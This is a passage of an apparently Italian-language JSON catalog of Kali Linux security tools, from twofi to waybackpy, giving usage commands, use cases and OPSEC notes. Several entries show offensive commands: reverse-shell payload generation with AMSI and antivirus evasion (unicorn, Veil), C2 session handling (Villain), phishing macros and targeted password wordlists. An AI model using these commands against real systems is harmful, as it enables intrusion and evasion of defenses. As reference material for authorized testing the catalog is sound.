limits.</p><p><strong>Reporting:</strong> segnalare responsabilmente secrets trovati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "twofi",
    "name": "twofi",
    "version": "2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/twofi/",
    "desc": "Genera wordlist da profili Twitter per password cracking targetizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Twofi</strong> (Twitter Words of Interest) genera wordlist personalizzate da profili Twitter. Estrae parole frequenti dai tweet di un utente per creare dizionari mirati per password cracking.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Twitter Scraping:</strong> estrae tweet da profili pubblici</p><p><strong>Word Extraction:</strong> identifica parole significative</p><p><strong>Frequency Analysis:</strong> ordina per frequenza d'uso</p><p><strong>Custom Rules:</strong> filtra per lunghezza minima</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera wordlist da utente\ntwofi -u target_username\n\n# Con lunghezza minima\ntwofi -u target_username -m 6\n\n# Da lista utenti\ntwofi -U users.txt\n\n# Output su file\ntwofi -u target_username > wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>targeted cracking</strong>, genera wordlist basate su interessi del target.</p><p>Per <strong>social engineering</strong>, identifica temi rilevanti per la vittima.</p><p>Per <strong>password audit</strong>, testa password basate su info personali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Limits:</strong> Twitter API ha rate limiting.</p><p><strong>Privacy:</strong> raccoglie dati pubblici ma sensibili.</p><p><strong>Authentication:</strong> richiede API keys per accesso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "ubertooth",
    "name": "ubertooth",
    "version": "2020.12.R1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ubertooth/",
    "desc": "Piattaforma Bluetooth sniffing e injection per attacchi su BLE e Bluetooth Classic.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ubertooth</strong> è una piattaforma hardware/software per security research su Bluetooth. Permette sniffing, injection e analisi di traffico Bluetooth Classic e BLE a livello di raw PHY layer.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>BT Classic Sniffing:</strong> cattura traffico 2.4GHz Bluetooth</p><p><strong>BLE Support:</strong> analisi Bluetooth Low Energy</p><p><strong>Packet Injection:</strong> inietta pacchetti nel canale</p><p><strong>Spectrum Analysis:</strong> visualizza spettro 2.4GHz</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Spectrum analyzer\nubertooth-specan\n\n# BLE sniffing\nubertooth-btle -f\n\n# Follow BLE device\nubertooth-btle -t AA:BB:CC:DD:EE:FF\n\n# Cattura pacchetti\nubertooth-rx -f\n\n# Dump in formato pcap\nubertooth-btle -f -c capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bluetooth security</strong>, analizza implementazioni BT/BLE.</p><p>Per <strong>IoT testing</strong>, reverse engineering protocolli BLE.</p><p>Per <strong>research</strong>, studia vulnerabilità stack Bluetooth.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware:</strong> richiede hardware Ubertooth One.</p><p><strong>Range:</strong> Bluetooth ha range limitato.</p><p><strong>Legal:</strong> intercettazione comunicazioni potrebbe essere illegale.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "unhide.rb",
    "name": "unhide.rb",
    "version": "22",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unhide.rb/",
    "desc": "Script Ruby per rilevare processi e connessioni nascosti da rootkit su sistemi Unix.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Unhide.rb</strong> è una reimplementazione Ruby di unhide per rilevare processi e connessioni nascosti da rootkit. Confronta output di diverse syscall per identificare discrepanze indicative di hiding.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Process Detection:</strong> trova processi nascosti da /proc</p><p><strong>TCP/UDP Scan:</strong> rileva porte nascoste</p><p><strong>Multiple Methods:</strong> varie tecniche di detection</p><p><strong>Ruby Implementation:</strong> facilmente estendibile</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan processi nascosti\nunhide-rb proc\n\n# Scan porte TCP nascoste\nunhide-rb tcp\n\n# Scan completo\nunhide-rb all\n\n# Verbose mode\nunhide-rb -v proc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>rootkit detection</strong>, trova malware che nasconde processi.</p><p>Per <strong>incident response</strong>, verifica integrità sistema compromesso.</p><p>Per <strong>forensics</strong>, identifica attività malevole nascoste.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rootkit Aware:</strong> rootkit avanzati possono eludere detection.</p><p><strong>False Positives:</strong> condizioni di race possono causare falsi positivi.</p><p><strong>Privileges:</strong> richiede root per scan completo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "unhide",
    "name": "unhide",
    "version": "20240510",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unhide/",
    "desc": "Rileva processi, porte TCP/UDP e filesystem nascosti da rootkit e malware.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Unhide</strong> è uno strumento forense per rilevare processi, porte e file nascosti da rootkit. Utilizza multiple tecniche di brute force e confronto syscall per identificare discrepanze nel sistema.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Process Unhiding:</strong> trova PID nascosti da /proc</p><p><strong>TCP/UDP Scanning:</strong> rileva porte non visibili</p><p><strong>Filesystem Check:</strong> trova file nascosti</p><p><strong>Multiple Techniques:</strong> brute force, compare, procfs</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan processi nascosti\nunhide proc\n\n# Scan con tutte le tecniche\nunhide -m -d sys procall brute\n\n# Scan porte TCP/UDP\nunhide-tcp\n\n# Quick scan\nunhide quick\n\n# Scan filesystem\nunhide-posix</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>rootkit hunting</strong>, identifica malware nascosto.</p><p>Per <strong>forensic analysis</strong>, verifica compromissione sistema.</p><p>Per <strong>security audit</strong>, baseline integrità sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Performance:</strong> brute force può essere lento.</p><p><strong>Kernel Rootkits:</strong> rootkit kernel-level difficili da rilevare.</p><p><strong>Live Analysis:</strong> sistema compromesso potrebbe falsificare risultati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "unicorn-magic",
    "name": "unicorn-magic",
    "version": "3.12",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unicorn-magic/",
    "desc": "Genera payload PowerShell per injection diretta in memoria con bypass AMSI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Unicorn è uno strumento per generare payload PowerShell che iniettano shellcode direttamente in memoria. Include tecniche di bypass AMSI e offuscamento per evadere AV e EDR durante operazioni red team.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Memory Injection:</strong> shellcode direttamente in memoria</p><p><strong>AMSI Bypass:</strong> tecniche per evitare Antimalware Scan Interface</p><p><strong>Multiple Payloads:</strong> Meterpreter, Cobalt Strike, custom</p><p><strong>Obfuscation:</strong> varie tecniche di offuscamento</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera payload Meterpreter reverse\npython unicorn.py windows/meterpreter/reverse_https LHOST LPORT\n\n# Macro per Office\npython unicorn.py windows/meterpreter/reverse_https LHOST LPORT macro\n\n# HTA payload\npython unicorn.py windows/meterpreter/reverse_https LHOST LPORT hta\n\n# Con Cobalt Strike\npython unicorn.py cobalt_strike.cs cs</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, genera payload evasivi per initial access.</p><p>Per <strong>phishing</strong>, crea macro Office malevole.</p><p>Per <strong>AV bypass</strong>, evade detection con memory injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> tecniche note possono essere rilevate.</p><p><strong>AMSI:</strong> bypass AMSI sono costantemente aggiornati.</p><p><strong>EDR:</strong> behavioral detection può rilevare injection.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "unicornscan",
    "name": "unicornscan",
    "version": "0.4.7",
    "icon": "../app/icons/unicornscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unicornscan/",
    "desc": "Port scanner asincrono userland per scansioni massive con rate elevati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Unicornscan</strong> è un port scanner asincrono userland progettato per scansioni massive ad alta velocità. Separa il sending dal receiving permettendo rate elevati senza perdita di accuratezza.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Asynchronous:</strong> sending/receiving separati per performance</p><p><strong>High Speed:</strong> rate fino a centinaia di kpps</p><p><strong>TCP/UDP:</strong> supporta entrambi i protocolli</p><p><strong>OS Fingerprinting:</strong> detection stack TCP/IP</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan TCP tutte le porte\nunicornscan -mT -Iv 192.168.1.0/24:a\n\n# Con rate specifico\nunicornscan -mT -r 10000 192.168.1.0/24:1-1024\n\n# Scan UDP\nunicornscan -mU 192.168.1.100:1-65535\n\n# OS fingerprinting\nunicornscan -mT -Iv -r 500 192.168.1.100:a</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>large-scale scanning</strong>, scansiona grandi range IP rapidamente.</p><p>Per <strong>asset discovery</strong>, mappa porte aperte in reti estese.</p><p>Per <strong>pentest</strong>, enumeration veloce di target multipli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noise:</strong> scan ad alto rate sono molto rumorosi.</p><p><strong>Detection:</strong> IDS rilevano facilmente scan aggressivi.</p><p><strong>Bandwidth:</strong> può saturare connessioni limitate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "uniscan",
    "name": "uniscan",
    "version": "6.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/uniscan/",
    "desc": "Scanner web per LFI, RFI, XSS, SQL injection con crawling automatico del sito.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Uniscan</strong> è uno scanner web che combina crawling automatico con vulnerability testing. Cerca vulnerabilità comuni come LFI, RFI, XSS e SQL injection analizzando automaticamente le pagine del sito.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Crawling:</strong> esplora automaticamente il sito</p><p><strong>Vulnerability Scanning:</strong> LFI, RFI, XSS, SQLi</p><p><strong>Fingerprinting:</strong> identifica tecnologie web</p><p><strong>Directory Enumeration:</strong> bruteforce directory comuni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo\nuniscan -u http://target.com/ -qweds\n\n# Solo vulnerability check\nuniscan -u http://target.com/ -d\n\n# Directory bruteforce\nuniscan -u http://target.com/ -w\n\n# Scan statico\nuniscan -u http://target.com/ -e\n\n# Dynamic tests\nuniscan -u http://target.com/ -s</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web assessment</strong>, scan rapido vulnerabilità web.</p><p>Per <strong>enumeration</strong>, scopre directory e file nascosti.</p><p>Per <strong>pentest</strong>, identifica punti di attacco applicazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noise:</strong> genera molto traffico HTTP.</p><p><strong>Logging:</strong> tutte le richieste loggabili.</p><p><strong>WAF:</strong> pattern injection facilmente bloccati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "unix-privesc-check",
    "name": "unix-privesc-check",
    "version": "1.4",
    "icon": "../app/icons/unix-privesc-check-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unix-privesc-check/",
    "desc": "Script per trovare misconfiguration di privilege escalation su sistemi Unix/Linux.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Unix-privesc-check</strong> è uno script che analizza sistemi Unix/Linux alla ricerca di misconfiguration che permettono privilege escalation. Controlla permessi file, SUID, capabilities, sudo e altre potenziali vie di escalation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>File Permissions:</strong> trova file/directory world-writable</p><p><strong>SUID/SGID:</strong> identifica binari con bit setuid</p><p><strong>Sudo Rules:</strong> analizza configurazione sudoers</p><p><strong>Cron Jobs:</strong> controlla script eseguiti da root</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Check standard\nunix-privesc-check standard\n\n# Check dettagliato\nunix-privesc-check detailed\n\n# Output su file\nunix-privesc-check standard > privesc_report.txt\n\n# Solo SUID check\nunix-privesc-check standard | grep -i suid</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, trova vie per escalare a root.</p><p>Per <strong>security audit</strong>, identifica misconfiguration.</p><p>Per <strong>hardening</strong>, verifica configurazione sicura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> accessi a file possono essere loggati.</p><p><strong>Time:</strong> scan completo può richiedere tempo.</p><p><strong>Noise:</strong> molti accessi filesystem sono visibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "repocrazy",
    "name": "repocrazy",
    "version": "0.7.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/repocrazy/",
    "desc": "Cerca informazioni sensibili nei repository Debian e Ubuntu pubblicati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Repocrazy</strong> è uno strumento per cercare informazioni sensibili nei repository Debian e Ubuntu pubblici. Analizza pacchetti .deb alla ricerca di credenziali, chiavi API, e altri secrets inclusi accidentalmente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Package Analysis:</strong> scarica e analizza pacchetti .deb</p><p><strong>Secret Detection:</strong> cerca password, chiavi, token</p><p><strong>Multiple Repos:</strong> supporta repository custom</p><p><strong>Regex Patterns:</strong> pattern configurabili per detection</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analizza repository Ubuntu\nrepocrazy --repo http://archive.ubuntu.com/ubuntu\n\n# Repository custom\nrepocrazy --repo http://custom.repo.com/debian\n\n# Solo pacchetti specifici\nrepocrazy --repo http://repo.com --package mypackage\n\n# Output JSON\nrepocrazy --repo http://repo.com --json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>security research</strong>, trova secrets in pacchetti pubblici.</p><p>Per <strong>supply chain audit</strong>, verifica sicurezza dipendenze.</p><p>Per <strong>bug bounty</strong>, cerca credenziali esposte.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Bandwidth:</strong> download pacchetti richiede banda.</p><p><strong>Storage:</strong> analisi richiede spazio temporaneo.</p><p><strong>Responsible Disclosure:</strong> segnalare secrets trovati ai maintainer.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "veil",
    "name": "veil",
    "version": "3.1.14",
    "icon": "../app/icons/veil-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/veil/",
    "desc": "Framework per generare payload con evasion AV: Python, PowerShell, C, Go.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Veil</strong> è un framework per generare payload con evasion antivirus. Include Veil-Evasion per payload standalone e Veil-Ordnance per shellcode, con supporto per Python, PowerShell, C, Go e altri linguaggi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Language:</strong> payload in Python, PowerShell, C, Go, Ruby</p><p><strong>Encryption:</strong> vari metodi di cifratura payload</p><p><strong>Obfuscation:</strong> tecniche multiple di offuscamento</p><p><strong>Shellcode Generation:</strong> con Veil-Ordnance</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Veil\nveil\n\n# Lista payload disponibili\nuse Evasion\nlist\n\n# Genera payload Python\nuse python/meterpreter/rev_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\ngenerate\n\n# PowerShell payload\nuse powershell/meterpreter/rev_tcp\ngenerate</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, genera payload che evadono AV.</p><p>Per <strong>phishing</strong>, crea eseguibili che passano controlli.</p><p>Per <strong>pentest</strong>, testa efficacia AV aziendale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> payload Veil noti possono essere rilevati.</p><p><strong>Heuristics:</strong> AV moderni usano behavioral analysis.</p><p><strong>Updates:</strong> aggiornare regolarmente per nuove tecniche.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "villain",
    "name": "villain",
    "version": "2.2.1",
    "icon": "../app/icons/villain-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/villain/",
    "desc": "Framework C2 Windows con agent multi-hop, evasion e gestione sessioni avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Villain</strong> è un framework C2 Windows-focused con agent multi-hop e capacità di evasion. Genera payload PowerShell e Python con cifratura, supporta pivoting e offre gestione avanzata delle sessioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Hop:</strong> routing attraverso catene di host</p><p><strong>Encrypted Comms:</strong> traffico cifrato AES</p><p><strong>Payload Types:</strong> PowerShell, Python, cmd stagers</p><p><strong>Session Management:</strong> gestione multipla sessioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Villain\nvillain\n\n# Genera payload PowerShell\ngenerate -t windows/powershell_reverse_tcp -p 4444\n\n# Lista sessioni\nsessions\n\n# Interagisci con sessione\nsession 1\n\n# Comandi sulla sessione\nexec whoami\nupload local.exe C:\\\\Temp\\\\remote.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, gestisce operazioni C2 su Windows.</p><p>Per <strong>pivoting</strong>, naviga reti interne via multi-hop.</p><p>Per <strong>persistence</strong>, mantiene accesso a lungo termine.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> pattern di traffico analizzabili.</p><p><strong>Signatures:</strong> stager possono essere rilevati.</p><p><strong>EDR:</strong> behavioral detection può identificare attività sospetta.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "voiphopper",
    "name": "voiphopper",
    "version": "2.04",
    "icon": "../app/icons/voiphopper-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/voiphopper/",
    "desc": "VLAN hopping su telefoni VoIP per accedere a VLAN voce da rete dati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>VoIPhopper</strong> è uno strumento per VLAN hopping che emula il comportamento di telefoni VoIP per ottenere accesso alla Voice VLAN da una rete dati standard. Sfrutta protocolli di discovery come CDP, DHCP e LLDP-MED per identificare e saltare nella VLAN voce isolata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CDP/LLDP Discovery:</strong> identifica automaticamente Voice VLAN tramite Cisco Discovery Protocol e LLDP-MED</p><p><strong>VLAN Tagging:</strong> configura interfaccia per 802.1Q tagging e accesso alla Voice VLAN</p><p><strong>Phone Emulation:</strong> impersona telefono VoIP per bypassare controlli di accesso basati su dispositivo</p><p><strong>Multi-vendor:</strong> supporta ambienti Cisco, Avaya, Nortel e altri vendor VoIP</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scopri Voice VLAN via CDP e hop automatico\nvoiphopper -i eth0 -c -a\n\n# Hop manuale a VLAN 100 con MAC spoofing\nvoiphopper -i eth0 -v 100 -m 00:1E:7A:XX:XX:XX\n\n# Workflow completo: discovery + hop + scan\nvoiphopper -i eth0 -c -a &amp;&amp; \\\n  nmap -sV -p 5060,5061 --script=sip-enum-users 10.100.0.0/24\n\n# LLDP-MED per ambienti non-Cisco\nvoiphopper -i eth0 -l -a\n\n# Cattura traffico VoIP post-hop\nvoiphopper -i eth0 -v 100 &amp;&amp; \\\n  tcpdump -i eth0.100 -w voip_capture.pcap port 5060 or portrange 10000-20000</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Segmentation Testing</strong>, verificare isolamento tra VLAN dati e voce.</p><p>Per <strong>VoIP Security Assessment</strong>, testare protezioni contro accesso non autorizzato a infrastruttura voce.</p><p>Per <strong>Lateral Movement</strong>, accedere a reti VoIP isolate durante penetration test.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> CDP/LLDP discovery genera traffico anomalo rilevabile da network monitoring. Switch con port security e dynamic ARP inspection possono bloccare l'attacco. MAC address cloning di telefoni è tracciabile nei log.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "wafw00f",
    "name": "wafw00f",
    "version": "2.3.1",
    "icon": "../app/icons/wafw00f-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wafw00f/",
    "desc": "Rileva WAF (Web Application Firewall) analizzando risposte HTTP e behavior.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WAFW00F</strong> è uno strumento di fingerprinting che identifica Web Application Firewall analizzando le risposte HTTP e i pattern comportamentali. Riconosce oltre 150 WAF diversi tramite signature delle risposte, codici di errore e header specifici dei vendor.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Detection:</strong> identifica 150+ WAF commerciali e open source tramite fingerprinting</p><p><strong>Aggressive Mode:</strong> modalità intensiva che invia payload malevoli per triggare risposte WAF</p><p><strong>Generic Detection:</strong> rileva WAF sconosciuti analizzando anomalie comportamentali</p><p><strong>Proxy Support:</strong> supporto per Tor e proxy HTTP per scansioni anonime</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Detection WAF con output JSON per automazione\nwafw00f https://target.com -o waf_results.json -f json\n\n# Scansione aggressiva via proxy Burp\nwafw00f -a https://target.com -p http://127.0.0.1:8080\n\n# Scansione bulk da lista target\ncat targets.txt | while read url; do wafw00f \"$url\" -o \"waf_$(echo $url | md5sum | cut -d' ' -f1).json\" -f json; done\n\n# Pipeline con nuclei per testare bypass\nwafw00f https://target.com -v &amp;&amp; \\\n  nuclei -u https://target.com -t waf-bypass/ -proxy http://127.0.0.1:8080\n\n# Custom User-Agent per evasione\nwafw00f https://target.com -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pre-Engagement Recon</strong>, identificare protezioni WAF prima di testare applicazioni web.</p><p>Per <strong>Bypass Strategy</strong>, selezionare tecniche di evasione appropriate al WAF rilevato.</p><p>Per <strong>Security Assessment</strong>, verificare corretta implementazione e visibilità WAF.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> request anomale per fingerprinting sono loggate dai WAF. Modalità aggressiva genera alert immediati. User-Agent wafw00f è signature nota. Usare proxy e randomizzare timing per ridurre fingerprint.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "WAF"
    ],
    "notes": null
  },
  {
    "id": "wapiti",
    "name": "wapiti",
    "version": "3.0.4",
    "icon": "../app/icons/wapiti-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wapiti/",
    "desc": "Scanner black-box per vulnerabilità web: XSS, SQLi, XXE, SSRF con crawling.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wapiti</strong> è uno scanner di vulnerabilità web black-box che analizza applicazioni tramite crawling automatico e injection di payload malevoli. Rileva XSS, SQL injection, XXE, SSRF, command injection, CRLF, path traversal e molte altre vulnerabilità senza accesso al codice sorgente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Vulnerability Classes:</strong> rileva 15+ classi di vulnerabilità web incluse OWASP Top 10</p><p><strong>Smart Crawling:</strong> spider intelligente con gestione form, JavaScript e autenticazione</p><p><strong>Module System:</strong> moduli specializzati per ogni tipo di vulnerabilità attivabili selettivamente</p><p><strong>Report Generation:</strong> report HTML, JSON, XML con dettagli su vulnerabilità trovate</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione completa con report HTML e scope limitato\nwapiti -u https://target.com -f html -o report.html --max-scan-time 3600\n\n# Autenticazione bearer token per API\nwapiti -u https://api.target.com -H \"Authorization: Bearer eyJhbG...\" -m sql,xxe,ssrf\n\n# Scansione con cookie di sessione (post-login)\nwapiti -u https://target.com -c \"PHPSESSID=abc123; auth=xyz789\" --scope folder\n\n# Escludere logout e profilo, profondità limitata\nwapiti -u https://target.com -x \"logout|signout|profile|account\" -d 3 --max-links 500\n\n# Pipeline CI/CD con threshold di vulnerabilità\nwapiti -u https://staging.target.com -f json -o results.json &amp;&amp; \\\n  jq '.vulnerabilities | length' results.json | \\\n  xargs -I {} sh -c '[ {} -gt 0 ] &amp;&amp; exit 1 || exit 0'\n\n# Proxy attraverso Burp per analisi manuale\nwapiti -u https://target.com -p http://127.0.0.1:8080 --verify-ssl 0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Security Assessment</strong>, scansione automatizzata di applicazioni web per vulnerabilità note.</p><p>Per <strong>Compliance Testing</strong>, verifica OWASP Top 10 e requisiti di sicurezza.</p><p>Per <strong>CI/CD Integration</strong>, scanning automatico in pipeline di deployment.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> genera traffico anomalo con pattern di attacco riconoscibili. WAF e IDS rilevano facilmente injection attempts. Molte request possono causare rate limiting. Usare scope limitato e throttling per ridurre impatto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "waybackpy",
    "name": "waybackpy",
    "version": "3.0.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/waybackpy/",
    "desc": "Client Python Wayback Machine per recuperare snapshot storici di siti web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Waybackpy</strong> è un client Python per interagire con Wayback Machine di Internet Archive. Permette di recuperare snapshot storici di siti web, salvare nuove versioni e cercare URL archiviati per OSINT e analisi della storia di un target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Archive Retrieval:</strong> recupera versioni storiche di pagine web dall'archivio</p><p><strong>Save Pages:</strong> salva nuovi snapshot di pagine su Wayback Machine</p><p><strong>CDX API:</strong> cerca tutti gli snapshot disponibili per un URL con metadata</p><p><strong>Python Library:</strong> integrabile in script Python per automazione OSINT</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Ottieni ultimo snapshot\nwaybackpy --url https://target.com --oldest\n\n# Cerca tutti gli snapshot\nwaybackpy --url https://target.com --known_urls\n\n# Salva pagina su archive\nwaybackpy --url https://target.com --save\n\n# Python API\nfrom waybackpy import WaybackMachineAvailabilityAPI</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Historical OSINT</strong>, recuperare versioni precedenti di siti per identificare informazioni rimosse.</p><p>Per <strong>Subdomain Discovery</strong>, trovare sottodomini storici non più attivi.</p><p>Per <strong>Credential Hunting</strong>, cercare configurazioni esposte in versioni passate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> query a Wayback Machine sono passive e non raggiungono il target direttamente. Le richieste sono loggate da Internet Archive. Rate limiting può essere applicato per query intensive.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "wce",
